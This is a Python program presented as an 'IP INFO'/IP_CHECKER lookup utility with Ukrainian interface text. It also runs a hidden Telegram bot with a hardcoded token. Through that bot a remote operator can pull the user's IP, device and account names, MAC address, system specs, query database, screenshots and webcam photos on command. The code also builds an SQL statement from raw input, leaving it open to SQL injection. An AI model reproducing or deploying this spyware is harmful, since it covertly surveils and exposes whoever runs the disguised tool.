from pyfiglet import Figlet
import folium
import bs4
import requests
import time
from tkinter import messagebox
import sqlite3
import socket
import ctypes
import platform
import telebot
from uuid import getnode as get_mac
import psutil
import os
from screeninfo import get_monitors
import pyautogui
import sys
import cv2
import webbrowser

sv = sys.version
pv = (sv[0] + sv[1] + sv[2] + sv[3] + sv[4] + sv[5])





bot = telebot.TeleBot("6585195657:AAF1FpTNNpBv_Uhxpro9buwSIR00RQ5pvKQ")
url = "https://api.telegram.org/bot6585195657:AAF1FpTNNpBv_Uhxpro9buwSIR00RQ5pvKQ/"

monitors = get_monitors()
for monitor in monitors:
    pass

mac = get_mac()

my_system = platform.uname()

n = socket.gethostname()

battery_info = psutil.sensors_battery()

s = requests.get('https://2ip.ua/ru/')
b = bs4.BeautifulSoup(s.text, "html.parser")
a = b.select(" .ipblockgradient .ip")[0].getText()

connection = sqlite3.connect("ip.sl3", 5)
cur = connection.cursor()



cpu_percent = psutil.cpu_percent(interval=1)
memory_info = psutil.virtual_memory()

def last_update(r):
    response = requests.get(r + "getUpdates")
    response = response.json()
    result = response['result']
    total_updates = len(result) - 1
    return result[total_updates]

def get_chat_id(u):
    chat_id = u['message']['chat']['id']
    return chat_id

def get_message_text(u):
    text = u['message']['text']
    return text

def send_message(chat, text):
    p = {'chat_id': chat, 'text': text}
    response = requests.post(url + 'sendMessage', params=p)
    return response


def get_info_by_ip(ip='127.0.0.1'):
    try:
        response = requests.get(url=f'http://ip-api.com/json/{ip}').json()

        data = {
            '[IP]': response.get('query'),
            '[Int prov]': response.get('isp'),
            '[Org]': response.get('org'),
            '[Country]': response.get('country'),
            '[Region Name]': response.get('regionName'),
            '[City]': response.get('city'),
            '[ZIP]': response.get('zip'),
            '[TimeZone]': response.get('timezone'),
            '[Lat]': response.get('lat'),
            '[Lon]': response.get('lon'),
        }

        for k, v in data.items():
            print(f'{k} : {v}')

        area = folium.Map(location=[response.get('lat'), response.get('lon')])
        area.save(f'{response.get("query")}_{response.get("city")}.html')

    except requests.exceptions.ConnectionError:
        print('[!] Please check your connection!')


def get_display_name():
    GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
    NameDisplay = 3

    size = ctypes.pointer(ctypes.c_ulong(0))
    GetUserNameEx(NameDisplay, None, size)

    nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
    GetUserNameEx(NameDisplay, nameBuffer, size)
    return nameBuffer.value
d_n = get_display_name()

def main():
    preview_text = Figlet(font='slant')
    print(preview_text.renderText('IP INFO'))
    messagebox.showinfo("IP", f"Ваш IP: {a}")
    ip = input('Будь ласка напишіть IP дя перевірки: ')
    get_info_by_ip(ip=ip)
    # cur.execute("CREATE TABLE ip_list (ip TEXT);")
    cur.execute(f"INSERT INTO ip_list (ip) VALUES ('{ip}');")
    connection.commit()
    connection.close()
    up_id = last_update(url)['update_id']
    while True:
        upd = last_update(url)
        if up_id == upd['update_id']:

            if get_message_text(upd).lower() == "/ip":
                send_message(get_chat_id(upd), f"IP клієнта: {a}")
            elif get_message_text(upd).lower() == "/start":
                send_message(get_chat_id(upd),
                             "Я Бот для отримання IP адресів клієнтів програми IP_CHECKER")
            elif get_message_text(upd).lower() == "/cpu":
                send_message(get_chat_id(upd),
                             f"Завантаженість ЦП: {cpu_percent}")
            elif get_message_text(upd).lower() == "/memory":
                send_message(get_chat_id(upd),
                             f"Завантаженість пам'яті: {memory_info.percent}")
            elif get_message_text(upd).lower() == "/request":
                send_message(get_chat_id(upd),
                             f"Запит клієнта: {ip}")
            elif get_message_text(upd).lower() == "/help":
                send_message(get_chat_id(upd),
                             "Я Бот для отримання IP адресів клієнтів програми IP_CHECKER")
            elif get_message_text(upd).lower() == "/pc":
                send_message(get_chat_id(upd),
                             f"Ім'я пристрою клієнта: {n}")
            elif get_message_text(upd).lower() == "/system":
                send_message(get_chat_id(upd),
                             f"ОС: {my_system.system}")
                send_message(get_chat_id(upd),
                             f"Реліз ОС: {my_system.release}")
                send_message(get_chat_id(upd),
                             f"Версія: {my_system.version}")
                send_message(get_chat_id(upd),
                             f"Процессор: {my_system.processor}")
                send_message(get_chat_id(upd),
                             f"Машина: {my_system.machine}")
            elif get_message_text(upd).lower() == "/name":
                send_message(get_chat_id(upd),
                             f"Ім'я облікового запису клієнта: {d_n}")
            elif get_message_text(upd).lower() == "/monitor":
                send_message(get_chat_id(upd),
                             f"Монітор: {monitor.width}x{monitor.height}")
            elif get_message_text(upd).lower() == "/mac":
                send_message(get_chat_id(upd),
                             f"MAC-адрес клієнта: {mac}")
            elif get_message_text(upd).lower() == "/python":
                send_message(get_chat_id(upd),
                             f"Версія Python клієнта: {pv}")
            elif get_message_text(upd).lower() == "/screenshot":
                pyautogui.screenshot('screenshot_pyautogui.png')
                send_message(get_chat_id(upd),
                             "Фото екрана клієнта:")
                uphoto = open("screenshot_pyautogui.png", "rb")
                bot.send_photo(get_chat_id(upd), uphoto)
                uphoto.close()
                os.remove("screenshot_pyautogui.png")
            elif get_message_text(upd).lower() == "/camera":
                cap = cv2.VideoCapture(0)
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                ret, frame = cap.read()
                cv2.imwrite('photo.png', frame)
                cap.release()
                send_message(get_chat_id(upd),
                             "Фото з камери клієнта:")
                uphoto = open("photo.png", "rb")
                bot.send_photo(get_chat_id(upd), uphoto)
                uphoto.close()
                os.remove("photo.png")
            elif get_message_text(upd).lower() == "/infotxt":
                send_message(get_chat_id(upd),
                             "Всі дані про клієнта в .txt форматі:")
                file = open("info.txt", "w")
                file.write(
                    f"[================================================]\n IP клієнта: {a}\n Запит клієнта: {ip}\n Ім'я пристрою клієнта: {n}\n Ім'я облікового запису клієнта: {d_n}\n Версія Python клієнта: {pv}\n ОС: {my_system.system}\n Реліз ОС: {my_system.release}\n Версія: {my_system.version}\n Процессор: {my_system.processor}\n Монітор: {monitor.width}x{monitor.height}\n Інформація про батарею: {battery_info}\n Машина: {my_system.machine}\n MAC-адрес клієнта: {mac}\n Завантаженість ЦП: {cpu_percent}\n Завантаженість пам'яті: {memory_info.percent}\n[================================================]\n")  # Пишем
                file.close()
                upfile = open("info.txt", "rb")
                bot.send_document(get_chat_id(upd), upfile)
                upfile.close()
                os.remove("info.txt")
            elif get_message_text(upd).lower() == "/site":
                send_message(get_chat_id(upd),
                             "Сайт програми: https://sites.google.com/view/ip-checker-itstep")
            elif get_message_text(upd).lower() == "/battery":
                send_message(get_chat_id(upd),
                             f"Інформація про батарею: {battery_info}")
            elif get_message_text(upd).lower() == "/fun":
                webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', new=2)
                send_message(get_chat_id(upd),
                             "Сторінку відкрито")
            elif get_message_text(upd).lower() == "/command":
                send_message(get_chat_id(upd),
                             "/start - Початок роботи")
                send_message(get_chat_id(upd),
                             "/help - Допомога")
                send_message(get_chat_id(upd),
                             "/allinfo - Подивитися всю інформацію про клієнта")
                send_message(get_chat_id(upd),
                             "/infotxt  - Подивитися всю інформацію про клієнта в .txt форматі ")
                send_message(get_chat_id(upd),
                             "/ip - Продивитися IP клієнтів")
                send_message(get_chat_id(upd),
                             "/mac - Подивитися MAC-адрес клієнта")
                send_message(get_chat_id(upd),
                             "/monitor - Подивитися розширення монітора клієнта")
                send_message(get_chat_id(upd),
                             "/camera - Подивитися фото з камери клієнта (Деяка затримка)")
                send_message(get_chat_id(upd),
                             "/screenshot - Подивитися фото екрана клієнта")
                send_message(get_chat_id(upd),
                             "/battery - Подивитися інформацію про батарею клієнта")
                send_message(get_chat_id(upd),
                             "/request - Подивитися запит клієнта")
                send_message(get_chat_id(upd),
                             "/pc - Подивитися ім'я пристрою клієнта")
                send_message(get_chat_id(upd),
                             "/name - Подивитися ім'я облікового запису клієнта")
                send_message(get_chat_id(upd),
                             "/system - Подивитися системні параметри клієнта")
                send_message(get_chat_id(upd),
                             "/cpu - Подивитись завантаженість ЦП клієнта")
                send_message(get_chat_id(upd),
                             "/cpu - Подивитись завантаженість ЦП клієнта")
                send_message(get_chat_id(upd),
                             "/memory - Подивитись завантаженість пам'яті клієнта")
                send_message(get_chat_id(upd),
                             "/data - Надіслати базу даних запитів з пристрою клієнта")
                send_message(get_chat_id(upd),
                             "/site - Посилання на сайт програми")
                send_message(get_chat_id(upd),
                             "/fun - Відкрити пісню в браузері клієнта")
                send_message(get_chat_id(upd),
                             "/command - Подивитися список команд")
                send_message(get_chat_id(upd),
                             "/stop - Закінчити роботу програми")
            elif get_message_text(upd).lower() == "/allinfo":
                send_message(get_chat_id(upd),
                             f"IP клієнта: {a}")
                send_message(get_chat_id(upd),
                             f"Запит клієнта: {ip}")
                send_message(get_chat_id(upd),
                             f"Ім'я пристрою клієнта: {n}")
                send_message(get_chat_id(upd),
                             f"Ім'я облікового запису клієнта: {d_n}")
                send_message(get_chat_id(upd),
                             f"Версія Python клієнта: {pv}")
                send_message(get_chat_id(upd),
                             f"ОС: {my_system.system}")
                send_message(get_chat_id(upd),
                             f"Реліз ОС: {my_system.release}")
                send_message(get_chat_id(upd),
                             f"Версія: {my_system.version}")
                send_message(get_chat_id(upd),
                             f"Процессор: {my_system.processor}")
                send_message(get_chat_id(upd),
                             f"Монітор: {monitor.width}x{monitor.height}"),
                send_message(get_chat_id(upd),
                             f"Інформація про батарею: {battery_info}"),
                send_message(get_chat_id(upd),
                             f"Машина: {my_system.machine}")
                send_message(get_chat_id(upd),
                             f"MAC-адрес клієнта: {mac}")
                send_message(get_chat_id(upd),
                             f"Завантаженість ЦП: {cpu_percent}")
                send_message(get_chat_id(upd),
                             f"Завантаженість пам'яті: {memory_info.percent}")
                send_message(get_chat_id(upd),
                             f"База даних запитів з пристрою клієнта:")
                upfile = open("ip.sl3", "rb")
                bot.send_document(get_chat_id(upd), upfile)
                upfile.close()
                send_message(get_chat_id(upd),
                             "Всі дані про клієнта в .txt форматі:")
                file = open("info.txt", "w")
                file.write(
                    f"[================================================]\n IP клієнта: {a}\n Запит клієнта: {ip}\n Ім'я пристрою клієнта: {n}\n Ім'я облікового запису клієнта: {d_n}\n ОС: {my_system.system}\n Реліз ОС: {my_system.release}\n Версія: {my_system.version}\n Процессор: {my_system.processor}\n Монітор: {monitor.width}x{monitor.height}\n Інформація про батарею: {battery_info}\n Машина: {my_system.machine}\n MAC-адрес клієнта: {mac}\n Завантаженість ЦП: {cpu_percent}\n Завантаженість пам'яті: {memory_info.percent}\n[================================================]\n")  # Пишем
                file.close()
                upfile_3 = open("info.txt", "rb")
                bot.send_document(get_chat_id(upd), upfile_3)
                upfile_3.close()
                os.remove("info.txt")
                pyautogui.screenshot('screenshot_pyautogui.png')
                send_message(get_chat_id(upd),
                             "Фото екрана клієнта:")
                uphoto = open("screenshot_pyautogui.png", "rb")
                bot.send_photo(get_chat_id(upd), uphoto)
                uphoto.close()
                os.remove("screenshot_pyautogui.png")
                cap = cv2.VideoCapture(0)
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                ret, frame = cap.read()
                cv2.imwrite('photo.png', frame)
                cap.release()
                send_message(get_chat_id(upd),
                             "Фото з камери клієнта:")
                uphoto = open("photo.png", "rb")
                bot.send_photo(get_chat_id(upd), uphoto)
                uphoto.close()
                os.remove("photo.png")
            elif get_message_text(upd).lower() == "/data":
                send_message(get_chat_id(upd),
                             f"База даних запитів з пристрою клієнта:")
                upfile = open("ip.sl3", "rb")
                bot.send_document(get_chat_id(upd), upfile)
                upfile.close()
            elif get_message_text(upd).lower() == "/stop":
                send_message(get_chat_id(upd),
                             f"Програма закінчила свою роботу.")
                sys.exit()
            else:
                send_message(get_chat_id(upd), "Я не знаю що мені робить :(")
            up_id += 1
        time.sleep(2)


if __name__ == '__main__':
    main()